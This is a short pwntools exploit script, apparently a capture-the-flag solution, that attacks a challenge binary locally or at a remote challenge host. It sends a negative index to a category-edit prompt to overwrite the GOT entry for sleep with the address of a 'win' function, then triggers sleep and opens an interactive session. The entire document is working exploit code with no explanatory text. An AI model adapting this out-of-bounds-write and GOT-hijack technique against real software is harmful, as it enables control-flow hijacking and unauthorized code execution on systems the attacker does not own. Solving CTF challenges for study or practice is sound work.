from pwn import *
import sys

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)


gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 22354)
    else:
        return process(e.path, level="error")


offset = (e.got['sleep']-e.sym['categories'])/15
info('Partial Offset = %2.5f' % offset)

p = start()

info("Sending Partial Overwrite")
p.recvuntil(b'Would you like edit a category (Y/*) >>>')
p.sendline(b'Y')
p.recvuntil(b'Which category num >>>')
p.sendline(b'-3')
p.recvuntil(b'Enter the new value >>>')
p.sendline(cyclic(5)+p64(e.sym['win']))

info("Triggering Sleep Function")
p.recvuntil(b'Would you like edit a category (Y/*) >>>')
p.sendline(b'Y')
p.recvuntil(b'Which category num >>>')
p.sendline(b'0')
p.recvuntil(b'Enter the new value >>>')
p.sendline(b'recon')

p.interactive()
